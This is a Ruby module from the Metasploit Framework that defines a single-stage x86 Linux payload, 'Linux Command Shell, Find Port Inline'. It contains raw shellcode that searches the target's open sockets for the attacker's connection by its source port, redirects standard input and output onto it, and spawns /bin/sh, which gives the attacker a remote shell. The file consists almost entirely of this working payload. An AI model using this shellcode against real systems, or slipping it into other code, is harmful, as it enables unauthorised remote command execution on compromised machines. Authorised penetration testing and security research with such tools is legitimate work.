require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Linux
module X86

module ShellFindPort

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Find Port Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Spawn a shell on an established connection',
			'Author'        => 'vlad902',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::FindPort,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'CPORT' => [ 26, 'n' ],
						},
					'Payload' =>
						"\x31\xd2\x52\x89\xe5\x6a\x07\x5b\x6a\x10\x54\x55" +
						"\x52\x89\xe1\xff\x01\x6a\x66\x58\xcd\x80\x66\x81" +
						"\x7d\x02\x11\x5c\x75\xf1\x5b\x6a\x02\x59\xb0\x3f" +
						"\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68" +
						"\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b" +
						"\xcd\x80"
				}
			))
	end

end

end end end end end
